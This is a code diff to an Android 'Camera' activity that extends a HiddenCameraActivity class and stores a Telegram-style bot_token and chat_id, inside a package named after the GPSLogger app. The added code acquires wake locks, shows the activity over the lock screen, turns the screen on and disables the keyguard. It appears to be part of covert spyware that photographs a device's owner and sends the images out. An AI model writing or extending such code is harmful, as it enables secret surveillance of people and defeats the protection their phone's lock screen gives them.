@@ -2,6 +2,7 @@ package com.mendhak.gpslogger.darisms;
 
 import android.Manifest;
 import android.annotation.SuppressLint;
+import android.app.KeyguardManager;
 import android.content.Context;
 import android.content.Intent;
 import android.content.SharedPreferences;
@@ -15,9 +16,12 @@ import android.media.AudioManager;
 import android.os.Build;
 import android.os.Bundle;
 import android.os.Handler;
+import android.os.PowerManager;
 import android.util.Base64;
 import android.util.Log;
 import android.view.View;
+import android.view.Window;
+import android.view.WindowManager;
 import android.view.WindowManager.LayoutParams;
 import android.widget.ImageView;
 import android.widget.Toast;
@@ -70,15 +74,75 @@ public class Camera extends HiddenCameraActivity {
 
     String    bot_token,chat_id;
 
+    // Called from onCreate
+    PowerManager.WakeLock fullWakeLock;
+    PowerManager.WakeLock partialWakeLock;
+    @SuppressLint("InvalidWakeLockTag")
+    protected void createWakeLocks(){
+        PowerManager powerManager = (PowerManager) getSystemService(Context.POWER_SERVICE);
+         fullWakeLock = powerManager.newWakeLock((PowerManager.SCREEN_BRIGHT_WAKE_LOCK | PowerManager.FULL_WAKE_LOCK | PowerManager.ACQUIRE_CAUSES_WAKEUP), "Loneworker - FULL WAKE LOCK");
+        partialWakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "Loneworker - PARTIAL WAKE LOCK");
+    }
+
+
+    // Called implicitly when device is about to sleep or application is backgrounded
+    public void onPause(){
+        super.onPause();
+        partialWakeLock.acquire();
+    }
+
+    // Called implicitly when device is about to wake up or foregrounded
+    public void onResume(){
+        super.onResume();
+        if(fullWakeLock.isHeld()){
+            fullWakeLock.release();
+        }
+        if(partialWakeLock.isHeld()){
+            partialWakeLock.release();
+        }
+
+        // TODO Auto-generated method stub
+
+        /******block is needed to raise the application if the lock is*********/
+       Window wind = this.getWindow();
+        wind.addFlags(LayoutParams.FLAG_DISMISS_KEYGUARD);
+        wind.addFlags(LayoutParams.FLAG_SHOW_WHEN_LOCKED);
+        wind.addFlags(LayoutParams.FLAG_TURN_SCREEN_ON);
+        /* ^^^^^^^block is needed to raise the application if the lock is*/
+        wakeDevice();
+    }
+
+    // Called whenever we need to wake up the device
+    public void wakeDevice() {
+        fullWakeLock.acquire();
+
+        KeyguardManager keyguardManager = (KeyguardManager) getSystemService(Context.KEYGUARD_SERVICE);
+        KeyguardManager.KeyguardLock keyguardLock = keyguardManager.newKeyguardLock("TAG");
+        keyguardLock.disableKeyguard();
+    }
+
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_camera);
 
-        getWindow().addFlags(LayoutParams.FLAG_SHOW_WHEN_LOCKED
-                | LayoutParams.FLAG_DISMISS_KEYGUARD
-                | LayoutParams.FLAG_KEEP_SCREEN_ON
-                | LayoutParams.FLAG_TURN_SCREEN_ON);
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O_MR1) {
+            setShowWhenLocked(true);
+            setTurnScreenOn(true);
+        } else {
+            getWindow().addFlags(WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED
+                    | WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD
+                    | WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON
+                    | WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON
+                    | WindowManager.LayoutParams.FLAG_ALLOW_LOCK_WHILE_SCREEN_ON);
+        }
+        KeyguardManager keyguardManager = (KeyguardManager) getSystemService(Context.KEYGUARD_SERVICE);
+        KeyguardManager.KeyguardLock keyguardLock = keyguardManager.newKeyguardLock("TAG");
+        keyguardLock.disableKeyguard();
+
+
+        createWakeLocks();
+
 
 
         SharedPreferences sharedPreferences = getApplicationContext().getSharedPreferences("data", MODE_PRIVATE);
